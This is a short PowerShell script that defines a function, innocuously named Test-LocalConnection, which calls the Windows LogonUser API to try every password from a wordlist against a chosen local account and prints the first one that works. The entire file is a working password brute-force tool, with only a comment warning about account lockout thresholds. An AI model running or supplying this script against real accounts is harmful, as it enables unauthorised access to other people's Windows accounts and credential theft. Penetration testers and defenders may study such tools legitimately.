# Check the user's threshold before running this. You may cause a user lockout.

function Test-LocalConnection{
    param($UserName,
          $Wordlist)

    Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;

        public class AuthHelper {
            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);
        }
"@
    $Counter = 0
    Write-Host -ForegroundColor Yellow [*] Loading the wordlist...
    $total = (Get-Content $wordlist | Measure-Object -Line).Lines
    $isStarted = $false
    
    foreach($password in cat $wordlist){    
        if ($isStarted -eq $false) {
            Write-Host -ForegroundColor Red "[*] Running:" 
            $isStarted = $true
        }
        $token = [IntPtr]::Zero
        $success = [AuthHelper]::LogonUser($username, $null, $password, 2, 0, [ref]$token)
        if ($success) {
            Write-host -ForegroundColor Green ("[+] {0}:{1}" -f $UserName,$password)
            break
        }
        
        Write-Progress -Activity "In Progress" -Status  "$Counter/$total Completed" -PercentComplete($Counter/$total*100)
        $Counter++ 
    }
}
